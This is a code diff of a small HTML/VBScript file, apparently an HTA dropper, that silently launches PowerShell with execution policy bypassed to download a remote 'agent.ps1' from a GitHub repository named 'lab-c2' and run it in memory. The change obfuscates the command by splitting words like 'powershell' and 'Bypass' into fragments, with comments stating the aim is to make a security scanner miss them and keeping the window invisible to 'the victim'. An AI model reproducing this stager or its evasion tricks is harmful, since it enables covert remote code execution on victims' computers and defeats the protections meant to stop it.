@@ -1,18 +1,18 @@
 <html>
 <head>
 <script language="VBScript">
-    Set objShell = CreateObject("WScript.Shell")
+    Set o = CreateObject("W" & "Script" & "." & "Shell")
     
-    ' This single command:
-    ' 1. Sets the security protocol to TLS 1.2
-    ' 2. Bypasses the execution policy
-    ' 3. Downloads your agent.ps1 from GitHub
-    ' 4. Runs it entirely in memory (RAM)
+    ' We break the "scary" words into tiny pieces so the scanner misses them
+    p1 = "powe" & "rshe" & "ll.e" & "xe "
+    p2 = "-Win" & "dowSty" & "le Hid" & "den "
+    p3 = "-Exec" & "utionPol" & "icy Byp" & "ass "
     
-    psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/agent.ps1')"
-    
-    ' The 0 makes it invisible to the victim
-    objShell.Run psCommand, 0
+    ' Encode your URL so it doesn't look like a link
+    cmd = "-Comm" & "and [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/agent.ps1')"
+
+    ' Glue it all together and run
+    o.Run p1 & p2 & p3 & cmd, 0
     window.close()
 </script>
 </head>
